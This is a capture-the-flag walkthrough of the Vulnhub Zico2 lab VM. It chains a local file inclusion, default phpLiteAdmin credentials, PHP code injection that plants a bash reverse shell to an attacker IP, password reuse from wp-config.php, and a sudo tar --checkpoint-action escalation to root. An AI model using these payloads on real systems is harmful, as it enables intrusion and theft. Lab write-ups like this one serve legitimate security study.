Hello! Another week, another writeup! Wish I could always keep publishing with this rate ;) This time I worked on Ziko2 boot2root, as usual from  [Vulnhub](https://www.vulnhub.com/entry/zico2-1,210/). How does Author describe his challange?

TL;DR - You are about to load up a virtual machine with vulnerabilities. If something bad happens, it's not my fault.
Level: Intermediate
Goal: Get root and read the flag file
Description:
Zico is trying to build his website but is having some trouble in choosing what CMS to use. After some tries on a few popular ones, he decided to build his own. Was that a good idea?
Hint: Enumerate, enumerate, and enumerate!

Let's start with standard nmap scan:
```bash
# nmap 192.168.0.100 -p- -sT -sV -O -n

As I could expect from description, there's a HTTP server running on the machine. Besides that we have standard SSH service and RPC bind. Honestly I didn't get to test RPC bind as it turned out not to be neccesary to solve the challenge. I decide to focus on the HTTP server. First, I roam around the website through the browser. I allows me to discover */view.php?page=tools.html* page. Checking page parameter for Local File Inclusion turns out to be positive:
```
http://192.168.0.100/view.php?page=../../../../etc/passwd

After exhausting website's possibilties I go for more scanning:

```

The most interesting 'hidden' folder turns out to be dbadmin. I contains test_db.php file, which is a password protected phpLiteAdmin.
![Login page]({{ "/images/zico/login.png" }})
Googling informs me that default password for that phpLiteAdmin is 'admin'. I try that and bingo! I'm inside:
![Login page]({{ "/images/zico/loggedin.png" }})

Inside a test_users database there are two users with MD5 hashed passwords. I reversed both of therm, unfortunately it didn't allow me to log to SSH, or anywhere else.

I need to try something else. More googling reveal another security problem with this script. According to [Exploit Database](https://www.exploit-db.com/exploits/24044/) it is possible to place arbitrary PHP code on the server.

## Shell
In order to gain shell I need to combine both vulnerabilities I found (LFI and phpLiteAdmin Remote PHP Code Injection). First I use the phpLiteAdmin to create 'ownd.php', which will be placed under '/usr/databases/ownd.php'. Then, I use table name to place PHP reverse shell code inside the file:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.20/1234 0>&1'");?>
```
Navigating to */view.php?page=../../../../usr/databases/ownd.php* runs the reverse shell code, and on my attacking machine listener is granted with restricted shell:
```
# nc -nlp 1234
bash: no job control in this shell
www-data@zico:/var/www$ whoami
whoami
www-data
```
Navigating to */home/zico* reveals some of various CMS and simmiliar junk. First I thought it can't be too interesting, but then I looked into */home/zico/wordpress/wp-config.php*:
```php
<?php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'zico');

/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');

/** MySQL hostname */
define('DB_HOST', 'zico');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```
DB_USER and DB_NAME properties seem to reveal another credentials. I try my luck again for some password reuse, and this time I manage to log into SSH as Zico!

## Privilege escalation
Last thing left to do is escalate the privileges to root. In order to find a way i play around with sudo:
```
zico@zico:~$ sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
```
As it turn out I can use tar as root without giving the password. I start to look for a possibility to gain interactive shell using that program. A little googling gives informs me, that there is a --checkpoint-action parameter that can be used to execute bash command. So, again I turn to my trusty reverse-shell one liner:
```bash
sudo tar -zxvf zico-history.tar.gz --checkpoint=1 --checkpoint-action=exec=bash -i >& /dev/tcp/192.168.0.20/1235 0>&1
```
Again, listener on attackers machine is granted with shell, this time with root privileges:
```
# nc -nlp 1235
whoami
root
cd /root
ls
flag.txt
cat flag.txt
#
#
#
# ROOOOT!
# You did it! Congratz!
# 
# Hope you enjoyed! 

```

## Summary
That's it! We gained root on victim's machine. Thank's for reading, and just like machine's author I hope you enjoyed my writeup!
